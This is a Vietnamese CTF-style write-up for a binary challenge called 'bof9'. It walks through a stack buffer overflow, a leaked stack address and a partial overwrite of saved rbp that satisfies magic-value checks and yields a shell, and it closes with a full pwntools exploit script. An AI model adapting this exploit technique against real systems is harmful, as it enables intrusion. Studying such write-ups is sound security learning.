# bof9
## Tự hành:
![image](https://github.com/NTDtrytofullstack/bof9/assets/130078745/0c59e8b4-fc6d-4939-80e5-a2ff9389d0d8)
![image](https://github.com/NTDtrytofullstack/bof9/assets/130078745/e6ad1d7c-3e59-47f8-8359-e08e8014f2ef)
- Với mỗi biến `v1` và `buf` thì mỗi biến có kiểu `int64` = 8byte và có 4 phần tử cho nên cũng có thể hiểu như là 1 biến char với 32 ký tự vậy(như ảnh ở dưới).
![image](https://github.com/NTDtrytofullstack/bof9/assets/130078745/25005cbe-7104-4106-8180-86ecbf9a7664)
- Khi chạy thử file thì ta nhận đc địa chỉ stack của biến `v4` và chúng ta cùng tiến hành lấy cái địa chỉ stack này thôi , và trong hàm `get_credential` bạn có thể thấy lỗi bof ở ngày biến `buf` vì vậy ta cũng sẽ vào terminal để cùng xem cách mà lỗi này hoạt động.
![image](https://github.com/NTDtrytofullstack/bof9/assets/130078745/3a7c3632-3781-46b0-a478-7407a5560bd4)
![image](https://github.com/NTDtrytofullstack/bof9/assets/130078745/8e457413-2506-4fcf-b1d8-bd0a40dc4766)
- Với mod DEBUG thì ta đã kiểm tra đc dữ liệu stack lấy đã đúng ta cần phải kiểm tra cách mà lỗi bof hoạt động nữa là xong , từ đó ta sẽ có hướng giải như sau.
![image](https://github.com/NTDtrytofullstack/bof9/assets/130078745/33d74aba-3a69-4fbc-a38d-fbee173a4899)
![image](https://github.com/NTDtrytofullstack/bof9/assets/130078745/2f00dba1-05f1-4231-b1a8-0bd5cc4069fb)
![image](https://github.com/NTDtrytofullstack/bof9/assets/130078745/883a89b4-532c-42a8-a9be-41ff5dd82051)
![image](https://github.com/NTDtrytofullstack/bof9/assets/130078745/f42702b7-260a-4087-8a71-220dfec04e29)
- Từ những thông tin trên những tấm ảnh thì ta có thể hiểu như sau: ở ảnh thứ 4 khi so sánh nó sẽ trỏ đến địa chỉ thanh ghi `rbp` trừ đi 1 khoản = `0x20`. Để giải bài này thì chúng ta có thể `overwrite rbp` để nó trỏ đến những giá trị mà điều kiện đề bài yêu cầu thay vì trỏ đến những thứ mà chương trình cho sẵn
- Bước đầu chúng ta sẽ tính chính xác điểm trỏ đến ở nơi chúng ta sẽ nhập vào đk của chương trình (đk của chương trình : `0x13371337` ,`0xCAFEBABE` và `0xDEADBEEF`)
![image](https://github.com/NTDtrytofullstack/bof9/assets/130078745/2f47029d-39aa-45c7-b6a4-cf8e3cba6c36)
- Khi tính toán thì ở địa chỉ mà stack mà ta leak đc ta sẽ trừ đi 1 khoản = 0x30 để có thể trỏ đến nơi mà ta sẽ nhập và khi vào hàm main nó sẽ trỏ đến 1 địa chỉ rbp-0x20 vì vậy ta cần cộng thêm để giữ nguyên vị trí mà ta sẽ nhập vào đk.
![image](https://github.com/NTDtrytofullstack/bof9/assets/130078745/8d6c799e-e31e-4bb1-b905-ba9d55a12ecc)
- tools của chúng ta hoàn thành sẽ đc như sau và giải thích 1 chút ở lệnh `payload += p64(fake_save_rbp)[0:2]` thì hiểu đơn giản ở đây từ 1 địa chỉ 8 byte với câu lệnh này nó sẽ gửi vào chỉ có 2 byte cuối như ta đã tính đc :Đ ( hiểu tới đó thui hehe).
```- 1 lưu ý nho nhỏ là bài này chúng ta vốn dĩ có thể làm bằng cách này là vì khi chương trình thực hiện hàm `get_credential` và trả ra dữ liệu nhập vào , ngay lập tức hàm main so sánh các đk,vì thế mà các giá trị ở stack đc lưu lại. Nếu như mà main thực hiện 1 hàm khác để làm điều đó thì cách địa chỉ stack sẽ bị thay đổi để chừa cho các biến trong hàm :(( ( khổ chưa mà :Đ ). Ae mà siêng thì chạy đến đc hàm system thì các giá trị mà ta nhập vào sẽ overwrite ngay lập tức :)) còn tui lười quá nên hong làm âu :>> ```
- Chạy thử tools thì ta đã thành công nhận đc shell.
- ![image](https://github.com/NTDtrytofullstack/bof9/assets/130078745/85fa0524-9f5f-4cc3-98d5-398b355fc9b7)
## source code: 
```
#!/usr/bin/python3
from pwn import *
exe = ELF('./bof9', checksec=False)

p=process(exe.path)


#gdb.attach(p, gdbscript = '''
#b*get_credential+115
#c
#)
#input()

p.recvuntil(b'user: ')
stack_leak = int(p.recvline(), 16)
log.info("stack leak: " + hex(stack_leak))
user_name = stack_leak - 0x30
fake_save_rbp = user_name + 0x20

payload =p64(0x13371337)
payload +=p64(0xDEADBEEF)
payload +=p64(0xCAFEBABE)
payload +=p64(0)
payload += p64(fake_save_rbp)[0:2]

p.sendafter(b'Username: ', payload)
p.sendafter(b'Password: ', b'a'*8)
p.interactive()
```
